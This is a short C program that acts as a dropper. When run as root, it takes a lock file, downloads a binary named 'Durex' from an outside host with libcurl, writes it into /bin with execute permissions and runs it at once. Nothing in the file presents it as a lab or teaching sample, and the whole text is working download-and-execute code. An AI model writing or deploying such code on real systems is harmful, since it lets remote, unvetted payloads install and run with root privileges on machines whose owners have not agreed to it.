#include <unistd.h>
#include <curl/curl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>


size_t write_data(void *buffer, size_t size, size_t nmemb, void *fd_data)
{
	(void)size;
	write(*(int*)fd_data, buffer, nmemb);
	return nmemb;
}

int		main()
{
	int fd;
	int fd_lock;
	CURL *handler;

	if (getuid() != 0)
		return (0);

	fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
	if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
		return (3);
	flock(fd_lock, LOCK_UN);


	fd = open("/bin/Durex", O_CREAT | O_WRONLY | O_TRUNC, 0700);
	if (fd == -1)
		return (0);

	handler = curl_easy_init();
	if (handler)
	{
		curl_easy_setopt(handler, CURLOPT_URL, "https://h3lp.fr/Durex");
		curl_easy_setopt(handler, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(handler, CURLOPT_FOLLOWLOCATION, 1);
		curl_easy_setopt(handler, CURLOPT_WRITEDATA, &fd);

		curl_easy_perform(handler);

		curl_easy_cleanup(handler);

		close(fd);

		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
	}
}
